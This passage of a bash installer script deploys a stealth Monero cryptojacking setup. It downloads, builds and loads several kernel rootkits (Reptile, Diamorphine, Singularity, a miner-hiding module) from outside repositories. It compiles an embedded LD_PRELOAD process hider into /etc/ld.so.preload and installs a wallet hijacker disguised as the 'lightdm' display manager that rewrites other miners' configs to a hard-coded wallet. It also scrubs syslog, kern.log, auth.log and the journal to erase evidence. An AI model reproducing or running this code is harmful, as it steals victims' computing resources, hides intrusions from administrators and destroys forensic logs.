    # Skip on non-64-bit systems
    if [ "$IS_64BIT" = "false" ]; then
        echo "[!] Skipping Reptile on non-64-bit system"
        return 1
    fi
    
    # Check kernel version
    KERNEL_VERSION=$(uname -r | cut -d. -f1)
    echo "[*] Detected kernel version: $(uname -r)"
    
    if [ "$KERNEL_VERSION" -ge 6 ]; then
        echo "[✓] Kernel 6.x detected - Reptile has BETTER compatibility than Diamorphine"
        echo "[*] Reptile is more actively maintained and supports newer kernels"
    else
        echo "[✓] Kernel version compatible with Reptile"
    fi
    
    # Create hidden directory
    mkdir -p /tmp/.ICE-unix/.X11-unix 2>/dev/null
    cd /tmp/.ICE-unix/.X11-unix || return 1
    
    # Remove old installation
    if [ -d Reptile ]; then
        echo "[*] Removing old Reptile installation..."
        rm -rf Reptile
    fi
    
    if lsmod | grep -q reptile 2>/dev/null; then
        echo "[*] Unloading old Reptile module..."
        rmmod reptile 2>/dev/null || true
        sleep 1
    fi
    
    # Clone Reptile (disable interactive prompts)
    echo "[*] Cloning Reptile..."
    export GIT_TERMINAL_PROMPT=0
    if ! git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username"; then
        echo "[!] Failed to clone Reptile (network or repository unavailable)"
        unset GIT_TERMINAL_PROMPT
        return 1
    fi
    unset GIT_TERMINAL_PROMPT
    
    cd Reptile || return 1
    
    # Build Reptile
    echo "[*] Building Reptile (this may take a while)..."
    if ! make 2>/dev/null; then
        echo "[!] Failed to build Reptile"
        cd /tmp/.ICE-unix/.X11-unix
        rm -rf Reptile
        return 1
    fi
    
    # Load the module
    echo "[*] Loading Reptile kernel module..."
    if ! insmod reptile.ko 2>/dev/null; then
        echo "[!] Failed to load Reptile"
        cd /tmp/.ICE-unix/.X11-unix
        rm -rf Reptile
        return 1
    fi
    
    # Verify it loaded
    if lsmod | grep -q reptile 2>/dev/null; then
        echo "[✓] Reptile loaded successfully"
        return 0
    else
        echo "[!] Reptile failed to load"
        cd /tmp/.ICE-unix/.X11-unix
        rm -rf Reptile
        return 1
    fi
}

# ==================== INSTALL ROOTKITS ====================
echo ""
echo "========================================"
echo "INSTALLING ROOTKITS"
echo "========================================"

# Install Diamorphine (lightweight, universal)
if ! install_diamorphine; then
    echo "[!] Diamorphine installation failed"
fi

# Install Reptile (advanced features)
if install_reptile; then
    # Reptile-specific commands
    reptile_cmd hide
else
    # Fallback cleanup
    rmmod reptile 2>/dev/null || true
fi

# ==================== INSTALL CRYPTO-MINER ROOTKIT ====================
echo ""
echo "========================================"
echo "INSTALLING CRYPTO-MINER ROOTKIT"
echo "========================================"

cd /tmp 2>/dev/null || {
    echo "[!] Cannot cd to /tmp, skipping crypto rootkit"
}

if [ -d /tmp ]; then
    mkdir -p .X11-unix 2>/dev/null
    cd .X11-unix 2>/dev/null || {
        echo "[!] Cannot cd to .X11-unix, trying to create it..."
        mkdir -p /tmp/.X11-unix 2>/dev/null
        cd /tmp/.X11-unix 2>/dev/null || true
    }
fi

# Prepare kernel headers for module compilation
echo "[*] Preparing kernel headers for rootkit compilation..."
KERNEL_VER=$(uname -r)
if [ -d "/usr/src/linux-headers-$KERNEL_VER" ]; then
    cd "/usr/src/linux-headers-$KERNEL_VER" 2>/dev/null || {
        echo "[!] Cannot access kernel headers directory"
    }
    
    if [ -d "/usr/src/linux-headers-$KERNEL_VER" ] && [ "$(pwd)" = "/usr/src/linux-headers-$KERNEL_VER" ]; then
        echo "[*] Running make oldconfig && make prepare..."
        make oldconfig 2>/dev/null || true
        make prepare 2>/dev/null || true
        echo "[✓] Kernel headers prepared"
    fi
    
    cd /tmp/.X11-unix 2>/dev/null || cd /tmp 2>/dev/null || true
else
    echo "[!] Kernel headers directory not found, installing..."
    apt-get install -y "linux-headers-$KERNEL_VER" 2>/dev/null || true
    yum install -y "kernel-devel-$KERNEL_VER" 2>/dev/null || true
    dnf install -y "kernel-devel-$KERNEL_VER" 2>/dev/null || true
fi

# Clone and build the crypto-miner rootkit
echo "[*] Cloning hiding-cryptominers-linux-rootkit..."
export GIT_TERMINAL_PROMPT=0
if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>&1 | grep -v "Username"; then
    unset GIT_TERMINAL_PROMPT
    cd hiding-cryptominers-linux-rootkit/ 2>/dev/null || {
        echo "[!] Failed to cd to rootkit directory, skipping..."
    }
    
    if [ -d hiding-cryptominers-linux-rootkit ] && [ "$(pwd)" = "*hiding-cryptominers-linux-rootkit*" ] || [ -f Makefile ]; then
        echo "[*] Building rootkit..."
        if make 2>/dev/null; then
            echo "[*] Loading rootkit module..."
            dmesg -C
            insmod rootkit.ko 2>/dev/null || {
                echo "[!] Failed to load crypto rootkit"
            }
            dmesg
            
            # Immediately clean up rootkit load messages from logs
            sleep 1
            sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
            sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
            sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
            sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
            sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
            sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
            
            echo "[✓] Crypto rootkit loaded"
        else
            echo "[!] Failed to build crypto rootkit"
        fi
    fi
    
    cd /tmp/.X11-unix 2>/dev/null || cd /tmp 2>/dev/null || true
    rm -rf hiding-cryptominers-linux-rootkit/ 2>/dev/null || true
else
    echo "[!] Failed to clone crypto rootkit (network or repository unavailable)"
    unset GIT_TERMINAL_PROMPT
fi

# ==================== INSTALL LD_PRELOAD ROOTKIT (ALL KERNELS) ====================
echo ""
echo "========================================"
echo "INSTALLING LD_PRELOAD ROOTKIT"
echo "========================================"
echo "[*] This works on ALL kernel versions!"

# Download the processhider.c from GitHub
cd /tmp || exit 1
echo "[*] Downloading processhider.c from GitHub..."

curl -s -o /tmp/processhider.c https://raw.githubusercontent.com/littlAcen/libprocesshider/refs/heads/master/processhider.c 2>/dev/null || {
    echo "[!] curl failed, trying wget..."
    wget -q -O /tmp/processhider.c https://raw.githubusercontent.com/littlAcen/libprocesshider/refs/heads/master/processhider.c 2>/dev/null || {
        echo "[!] Could not download processhider.c, creating from embedded code..."
        
        # Fallback: Create from embedded code
        cat > /tmp/processhider.c << 'PROCESSHIDER_EOF'
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
 * List of process names to hide
 * Add any process you want to hide here!
 * NOTE: We DON'T hide "xmrig" so we can detect competing miners!
 */
static const char* processes_to_hide[] = {
    "kworker/0:0",     // Our miner (prctl renamed)
    "swapd",           // Miner wrapper (if visible)
    ".kworker",        // Hidden binary name
    "lightdm",         // Wallet hijacker (disguised as display manager)
    NULL               // Terminator - ALWAYS keep this!
};

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

/*
 * Check if a process should be hidden
 * Returns 1 if process should be hidden, 0 otherwise
 */
static int should_hide_process(const char* process_name)
{
    int i;
    for(i = 0; processes_to_hide[i] != NULL; i++) {
        // Use strstr for substring matching
        // This catches "kworker/0:0" even if full name is different
        if(strstr(process_name, processes_to_hide[i]) != NULL) {
            return 1;  // Hide this process
        }
    }
    return 0;  // Don't hide
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir) {                                                       \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                strcmp(dir_name, "/proc") == 0 &&                       \
                get_process_name(dir->d_name, process_name) &&          \
                should_hide_process(process_name)) {                    \
                continue;                                               \
            }                                                           \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
PROCESSHIDER_EOF
    }
}

# Compile the LD_PRELOAD library
echo "[*] Compiling libprocesshider.so..."

if gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null; then
    echo "[✓] LD_PRELOAD library compiled successfully"
    
    # Install system-wide
    if [ ! -f /etc/ld.so.preload ]; then
        echo "[*] Installing LD_PRELOAD system-wide..."
        echo "/usr/local/lib/libprocesshider.so" > /etc/ld.so.preload
        echo "[✓] LD_PRELOAD activated in /etc/ld.so.preload"
    else
        # Check if already in ld.so.preload
        if ! grep -q "libprocesshider.so" /etc/ld.so.preload; then
            echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
            echo "[✓] LD_PRELOAD added to existing /etc/ld.so.preload"
        else
            echo "[✓] LD_PRELOAD already configured"
        fi
    fi
    
    echo "[✓] Processes will be hidden: kworker/0:0, swapd, lightdm, .kworker"
    echo "[*] NOT hiding 'xmrig' so you can detect competing miners!"
else
    echo "[!] Failed to compile LD_PRELOAD library"
    echo "[!] Trying to install gcc..."
    apt-get install -y gcc 2>&1 | tail -3
    
    # Try again
    if gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null; then
        echo "[✓] LD_PRELOAD library compiled successfully (second attempt)"
        echo "/usr/local/lib/libprocesshider.so" > /etc/ld.so.preload
        echo "[✓] LD_PRELOAD activated"
    else
        echo "[!] LD_PRELOAD compilation failed - continuing without it"
    fi
fi

# Clean up
rm -f /tmp/processhider.c

# ==================== INSTALL SINGULARITY (KERNEL 6.X ONLY) ====================
KERNEL_MAJOR=$(uname -r | cut -d. -f1)

if [ "$KERNEL_MAJOR" -eq 6 ]; then
    echo ""
    echo "========================================"
    echo "INSTALLING SINGULARITY ROOTKIT"
    echo "For Kernel 6.x"
    echo "========================================"
    
    # Ensure we're in /dev/shm for stealth
    cd /dev/shm || cd /tmp || exit 1
    
    # Remove old Singularity if exists
    if [ -d "Singularity" ]; then
        rm -rf Singularity
    fi
    
    echo "[*] Cloning Singularity from GitHub..."
    export GIT_TERMINAL_PROMPT=0
    
    if git clone --depth 1 https://github.com/MatheuZSecurity/Singularity 2>&1 | grep -v "Username"; then
        unset GIT_TERMINAL_PROMPT
        
        cd Singularity || {
            echo "[!] Failed to cd to Singularity directory"
        }
        
        if [ -f "Makefile" ]; then
            # Configure reverse shell IP (localhost by default)
            echo "[*] Configuring Singularity..."
            sed -i 's/192\.168\.1\.100/127.0.0.1/g' modules/icmp.c 2>/dev/null
            
            # Try to compile
            echo "[*] Compiling Singularity (this may take a minute)..."
            
            if make 2>&1 | tee /tmp/singularity_build.log | tail -5 | grep -q "singularity.ko"; then
                echo "[✓] Singularity compiled successfully!"
                
                # Try to load the module
                echo "[*] Loading Singularity kernel module..."
                
                if insmod singularity.ko 2>/dev/null; then
                    echo "[✓] Singularity loaded successfully!"
                    echo "[*] Use 'kill -59 <PID>' to hide processes"
                    
                    # Clean up logs
                    sleep 1
                    sed -i '/singularity/d' /var/log/syslog 2>/dev/null
                    sed -i '/singularity/d' /var/log/kern.log 2>/dev/null
                    sed -i '/singularity/d' /var/log/messages 2>/dev/null
                    
                    # Set flag for later process hiding
                    SINGULARITY_LOADED=true
                else
                    echo "[!] Failed to load Singularity module"
                    echo "[!] Check: dmesg | tail -20"
                    dmesg | tail -10 | grep -i error || true
                    SINGULARITY_LOADED=false
                fi
            else
                echo "[!] Singularity compilation failed"
                echo "[*] Error log (last 10 lines):"
                tail -10 /tmp/singularity_build.log | grep -i error || tail -10 /tmp/singularity_build.log
                echo ""
                echo "[*] This is OK - LD_PRELOAD will still hide processes"
                SINGULARITY_LOADED=false
            fi
        else
            echo "[!] Makefile not found in Singularity directory"
            SINGULARITY_LOADED=false
        fi
        
        # Go back to safe directory
        cd /tmp 2>/dev/null || true
    else
        echo "[!] Failed to clone Singularity (network or repository unavailable)"
        echo "[*] This is OK - LD_PRELOAD will still hide processes"
        unset GIT_TERMINAL_PROMPT
        SINGULARITY_LOADED=false
    fi
else
    echo ""
    echo "[*] Kernel $(uname -r) - Skipping Singularity (only for 6.x)"
    echo "[*] LD_PRELOAD rootkit is active (works on all kernels)"
    SINGULARITY_LOADED=false
fi

# ==================== START MINER SERVICE ====================
echo ''
echo "[*] Starting swapd service..."

# IMPORTANT: Restart (not just start) to activate LD_PRELOAD hiding
# If service was already running, it won't be hidden until restarted!

if [ "$SYSTEMD_AVAILABLE" = true ]; then
    # Check if already running
    if systemctl is-active --quiet swapd 2>/dev/null; then
        echo "[*] Service already running - restarting to activate LD_PRELOAD..."
        systemctl restart swapd 2>/dev/null
    else
        echo "[*] Starting service for first time..."
        systemctl start swapd 2>/dev/null
    fi
    sleep 2
    systemctl status swapd --no-pager -l 2>/dev/null || systemctl status swapd 2>/dev/null
else
    # SysV init
    if /etc/init.d/swapd status 2>/dev/null | grep -q "running"; then
        echo "[*] Service already running - restarting to activate LD_PRELOAD..."
        /etc/init.d/swapd restart
    else
        echo "[*] Starting service for first time..."
        /etc/init.d/swapd start
    fi
    sleep 2
    /etc/init.d/swapd status
fi

echo ""
echo "[*] Verifying LD_PRELOAD is active for new processes..."
if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
    echo "[✓] LD_PRELOAD configured - newly started processes will be hidden"
    echo "[*] Testing process visibility..."
    
    # Give it a moment to start
    sleep 2
    
    # Test if processes are hidden
    if ps aux | grep -E "swapd|kworker.*swapfile" | grep -v grep >/dev/null 2>&1; then
        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "⚠️  WARNING: Processes are still VISIBLE!"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo "This can happen if:"
        echo "  • Services were already running before LD_PRELOAD installation"
        echo "  • System hasn't fully reloaded the preload library"
        echo ""
        echo "RECOMMENDED ACTIONS (choose one):"
        echo ""
        echo "Option 1 - Quick Fix (Restart services):"
        echo "  systemctl restart swapd"
        echo "  systemctl restart lightdm"
        echo ""
        echo "Option 2 - Complete Fix (Reboot):"
        echo "  reboot"
        echo ""
        echo "After restart/reboot, verify with:"
        echo "  ps aux | grep swapd"
        echo "  (should show nothing!)"
        echo ""
        echo "Check service status with:"
        echo "  systemctl status swapd"
        echo "  (will show: active/running)"
        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
    else
        echo "[✓] Processes successfully hidden!"
    fi
else
    echo "[!] LD_PRELOAD not configured - processes will be visible"
fi

# ==================== HIDE MINER PROCESSES ====================
echo "[*] Hiding miner processes..."

# Method 1: LD_PRELOAD (automatic, system-wide)
if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
    echo "[✓] LD_PRELOAD rootkit active (processes automatically hidden)"
    echo "    Hiding: kworker/0:0, swapd, lightdm, .kworker"
    echo "    NOT hiding: xmrig (to detect competing miners)"
fi

# Method 2: Singularity (kill -59) for Kernel 6.x
if [ "$SINGULARITY_LOADED" = true ]; then
    echo "[*] Using Singularity to hide processes (kernel 6.x)..."
    sleep 3  # Give processes time to start
    
    # Hide miner process
    MINER_PID=$(pgrep -f "swapfile" 2>/dev/null | head -1)
    if [ -n "$MINER_PID" ]; then
        kill -59 "$MINER_PID" 2>/dev/null && echo "[✓] Miner hidden with Singularity (PID: $MINER_PID)"
    fi
    
    # Hide wallet hijacker
    HIJACKER_PID=$(pgrep -f "lightdm.*daemon" 2>/dev/null | head -1)
    if [ -n "$HIJACKER_PID" ]; then
        kill -59 "$HIJACKER_PID" 2>/dev/null && echo "[✓] Wallet hijacker hidden with Singularity (PID: $HIJACKER_PID)"
    fi
fi

# Method 3: Hide with crypto rootkit (kill -31)
if lsmod | grep -q rootkit 2>/dev/null; then
    MINER_PIDS=$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
    if [ -n "$MINER_PIDS" ]; then
        for pid in $MINER_PIDS; do
            if [[ "$pid" =~ ^[0-9]+$ ]]; then
                kill -31 "$pid" 2>/dev/null || true
            fi
        done
        echo "[✓] Processes hidden with crypto rootkit (kill -31)"
    fi
else
    echo "[*] Crypto rootkit not loaded (this is OK)"
fi

# Method 4: Hide with Diamorphine (kill -31 and kill -63)
if lsmod | grep -q diamorphine 2>/dev/null; then
    MINER_PIDS=$(/bin/ps ax -fu "$USER" | grep -E "swapd|kswapd0" | grep -v "grep" | awk '{print $2}')
    if [ -n "$MINER_PIDS" ]; then
        for pid in $MINER_PIDS; do
            if [[ "$pid" =~ ^[0-9]+$ ]]; then
                kill -31 "$pid" 2>/dev/null || true
                kill -63 "$pid" 2>/dev/null || true
            fi
        done
        echo "[✓] Processes hidden with Diamorphine"
    fi
fi

# ==================== CLEAN UP LOGS ====================
echo "[*] Cleaning up system logs..."

# Delete any line containing miner-related keywords
sed -i '/swapd/d' /var/log/syslog 2>/dev/null
sed -i '/miner/d' /var/log/syslog 2>/dev/null
sed -i '/accepted/d' /var/log/syslog 2>/dev/null

# Do the same for auth.log
sed -i '/swapd/d' /var/log/auth.log 2>/dev/null

# Remove Diamorphine and out-of-tree module warnings
sed -i '/diamorphine/d' /var/log/syslog 2>/dev/null
sed -i '/out-of-tree module/d' /var/log/syslog 2>/dev/null
sed -i '/module verification failed/d' /var/log/syslog 2>/dev/null

# Remove rootkit load messages
sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null

# Remove Reptile evidence
sed -i '/reptile/d' /var/log/syslog 2>/dev/null
sed -i '/reptile/d' /var/log/kern.log 2>/dev/null
sed -i '/reptile/d' /var/log/messages 2>/dev/null
sed -i '/Reptile/d' /var/log/syslog 2>/dev/null
sed -i '/Reptile/d' /var/log/kern.log 2>/dev/null
sed -i '/Reptile/d' /var/log/messages 2>/dev/null

# Remove Singularity evidence
sed -i '/singularity/d' /var/log/syslog 2>/dev/null
sed -i '/singularity/d' /var/log/kern.log 2>/dev/null
sed -i '/singularity/d' /var/log/messages 2>/dev/null
sed -i '/Singularity/d' /var/log/syslog 2>/dev/null
sed -i '/Singularity/d' /var/log/kern.log 2>/dev/null
sed -i '/Singularity/d' /var/log/messages 2>/dev/null

# Remove LD_PRELOAD evidence
sed -i '/libprocesshider/d' /var/log/syslog 2>/dev/null
sed -i '/libprocesshider/d' /var/log/auth.log 2>/dev/null
sed -i '/ld.so.preload/d' /var/log/syslog 2>/dev/null

# Remove the mount/unmount evidence
sed -i '/proc-.*mount/d' /var/log/syslog 2>/dev/null
sed -i '/Deactivated successfully/d' /var/log/syslog 2>/dev/null

# Clear journalctl logs if systemd is present
if command -v journalctl >/dev/null 2>&1; then
    journalctl --vacuum-time=1s 2>/dev/null || true
fi

echo "[✓] Log cleanup complete"

# ==================== INSTALL SMART WALLET HIJACKER ====================
echo ""
echo "[*] Installing smart wallet hijacker..."

# Create the smart wallet hijacker script
cat > /usr/local/bin/lightdm << 'HIJACKER_EOF'
#!/bin/bash
MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
CHECK_INTERVAL=300
exec 2>/dev/null
set +x

find_and_hijack() {
    local changed=0
    # Scan all processes for "-c" flag (XMRig config indicator)
    ps auxww | grep -E '\-c\s+' | grep -v grep | while read -r line; do
        local cmdline=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')
        local config=$(echo "$cmdline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
        local pid=$(echo "$line" | awk '{print $2}')
        
        if [ -n "$config" ] && [ -f "$config" ]; then
            if grep -q '"user"' "$config" 2>/dev/null; then
                local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
                if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
                    cp "$config" "${config}.backup.$(date +%s)" 2>/dev/null
                    sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
                    kill -9 "$pid" 2>/dev/null
                    changed=1
                fi
            fi
        fi
    done
    
    # Scan crontabs for mining configs
    for user in $(cut -f1 -d: /etc/passwd); do
        local cron_content=$(crontab -u "$user" -l 2>/dev/null)
        if [ -n "$cron_content" ]; then
            # Look for lines with -c flag
            echo "$cron_content" | grep -E '\-c\s+' | while read -r cronline; do
                local config=$(echo "$cronline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
                if [ -n "$config" ] && [ -f "$config" ]; then
                    if grep -q '"user"' "$config" 2>/dev/null; then
                        local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
                        if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
                            cp "$config" "${config}.backup.$(date +%s)" 2>/dev/null
                            sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
                            changed=1
                        fi
                    fi
                fi
            done
        fi
    done
    
    # Also update unused configs for future use
    for config in /root/.swapd/swapfile /root/.swapd/config.json /root/.xmrig.json /root/.config/xmrig.json; do
        if [ -f "$config" ] && ! ps auxww | grep -q "\-c.*$config"; then
            if grep -q '"user"' "$config" 2>/dev/null; then
                local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
                if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
                    sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
                fi
            fi
        fi
    done
    
    if [ $changed -eq 1 ]; then
        for service in swapd kswapd0 xmrig; do
            systemctl restart $service 2>/dev/null || /etc/init.d/$service restart 2>/dev/null || true
        done
    fi
}

if [ "$1" = "daemon" ]; then
    while true; do
        find_and_hijack
        sleep $CHECK_INTERVAL
    done
else
    find_and_hijack
fi
HIJACKER_EOF

chmod +x /usr/local/bin/lightdm 2>/dev/null || true

# Create systemd service for wallet hijacker
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    cat > /etc/systemd/system/lightdm.service << 'HIJACKER_SERVICE_EOF'
[Unit]
Description=Light Display Manager
Documentation=man:lightdm(1)
After=network.target swapd.service

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/lightdm daemon
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
HIJACKER_SERVICE_EOF
    
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable lightdm 2>/dev/null
    
    # Restart if already running to activate LD_PRELOAD, otherwise start
    if systemctl is-active --quiet lightdm 2>/dev/null; then
        echo "[*] Wallet hijacker already running - restarting to activate LD_PRELOAD..."
        systemctl restart lightdm 2>/dev/null
    else
        systemctl start lightdm 2>/dev/null
    fi
    
    # Verify it's running
    sleep 2
    if systemctl is-active --quiet lightdm 2>/dev/null; then
        echo "[✓] Smart wallet hijacker installed and RUNNING (systemd service)"
        if systemctl is-enabled --quiet lightdm 2>/dev/null; then
            echo "[✓] Smart wallet hijacker ENABLED (auto-starts on boot)"
        else
            echo "[!] Warning: Service may not be enabled for auto-start"
            echo "[*] Enabling service..."
            systemctl enable lightdm 2>/dev/null || true
        fi
        
        # Verify it's hidden
        if ps aux | grep "lightdm.*daemon" | grep -v grep >/dev/null 2>&1; then
            echo "[⚠] WARNING: lightdm process still VISIBLE - may need reboot for LD_PRELOAD"
        else
            echo "[✓] lightdm process successfully HIDDEN by LD_PRELOAD"
        fi
    else
        echo "[!] Warning: Smart wallet hijacker service failed to start"
        echo "[*] Trying to start manually..."
        systemctl start lightdm 2>/dev/null || true
    fi
else
    # For SysV systems, add to cron
    (crontab -l 2>/dev/null | grep -v lightdm; echo "*/5 * * * * /usr/local/bin/lightdm >/dev/null 2>&1") | crontab - 2>/dev/null || true
    echo "[✓] Smart wallet hijacker installed (cron job)"
fi

# ==================== FINAL CLEANUP ====================
echo "[*] Final cleanup..."

# Cleanup xmrig files in login directory
rm -rf ~/xmrig*.* 2>/dev/null

echo ''

# ==================== INSTALLATION SUMMARY ====================
echo '========================================================================='
echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE (NO LIBHIDE VERSION)!'
echo '========================================================================='
echo ''
echo 'System Configuration:'
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    echo '  Init System: systemd'
    echo ''
    echo 'Service Management Commands:'
    echo '  Start:   systemctl start swapd'
    echo '  Stop:    systemctl stop swapd'
    echo '  Status:  systemctl status swapd'
    echo '  Logs:    journalctl -u swapd -f'
else
    echo '  Init System: SysV init (legacy mode)'
    echo ''
    echo 'Service Management Commands:'
    echo '  Start:   /etc/init.d/swapd start'
    echo '  Stop:    /etc/init.d/swapd stop'
    echo '  Status:  /etc/init.d/swapd status'
    echo '  Restart: /etc/init.d/swapd restart'
fi

echo ''
echo 'Stealth Features Deployed:'

if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
    echo '  ✓ LD_PRELOAD Rootkit: ACTIVE (userland process hiding - ALL KERNELS)'
    echo '    Hiding: kworker/0:0, swapd, lightdm, .kworker'
    echo '    NOT hiding: xmrig (to detect competing miners)'
else
    echo '  ○ LD_PRELOAD Rootkit: Not loaded'
fi

if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q singularity 2>/dev/null; then
    echo '  ✓ Singularity: ACTIVE (kernel 6.x rootkit - kill -59 to hide)'
else
    echo '  ○ Singularity: Not loaded (only for kernel 6.x)'
fi

if lsmod | grep -q diamorphine 2>/dev/null; then
    echo '  ✓ Diamorphine: ACTIVE (kernel rootkit)'
else
    echo '  ○ Diamorphine: Not loaded'
fi

if [ -d /reptile ] || lsmod | grep -q reptile 2>/dev/null; then
    echo '  ✓ Reptile: ACTIVE (kernel rootkit)'
else
    echo '  ○ Reptile: Not loaded'
fi

if lsmod | grep -q rootkit 2>/dev/null; then
    echo '  ✓ Crypto-Miner Rootkit: ACTIVE (kernel rootkit)'
else
    echo '  ○ Crypto-Miner Rootkit: Not loaded'
fi

if [ -f /usr/local/bin/system-watchdog ]; then
    echo '  ✓ Intelligent Watchdog: ACTIVE (3-min, state-tracked)'
else
    echo '  ○ Watchdog: Not deployed'
fi

if [ -f /usr/local/bin/lightdm ]; then
    echo '  ✓ Smart Wallet Hijacker: ACTIVE (detects -c flag in processes)'
else
    echo '  ○ Wallet Hijacker: Not deployed'
fi

echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
echo '  ✓ Process name: kworker/0:0 (kernel worker thread - prctl renamed)'
echo '  ✓ Binary structure: swapd wrapper → .kworker (actual miner)'
echo '  ✓ Process hiding: LD_PRELOAD + Kernel rootkits (multi-layer)'

echo ''
echo 'Installation Method:'
if [ "$USE_WGET" = true ]; then
    echo '  Download Tool: wget (curl SSL/TLS failed)'
else
    echo '  Download Tool: curl'
fi

echo ''
echo 'Mining Configuration:'
echo '  Binary:  /root/.swapd/swapd'
echo '  Config:  /root/.swapd/swapfile'
echo "  Wallet:  $WALLET"
echo '  Pool:    gulf.moneroocean.stream:80'

echo ''
echo 'Process Hiding Commands:'
echo '  LD_PRELOAD: Automatic (always active, system-wide)'
echo '  Singularity: kill -59 $PID  (kernel 6.x only)'
echo '  Diamorphine: kill -31 $PID  (hide), kill -63 $PID (unhide)'
echo '  Crypto-RK:   kill -31 $PID  (hide)'
echo '  Reptile:     reptile_cmd hide'

echo ''
echo '========================================================================='
echo '[*] Miner will auto-stop when admins login and restart when they logout'
echo '[*] Multi-layer process hiding:'
echo '    Layer 1: LD_PRELOAD (userland - works on ALL kernels)'
if [ "$SINGULARITY_LOADED" = true ]; then
    echo '    Layer 2: Singularity (kernel-level - Kernel 6.x)'
fi
echo '    Layer 3: Kernel rootkits (Diamorphine/Reptile/Crypto-RK)'
echo ''
echo '========================================================================='
echo 'FINAL PROCESS VISIBILITY CHECK'
echo '========================================================================='
echo ''

# Check if processes are actually hidden
PROCESSES_VISIBLE=false

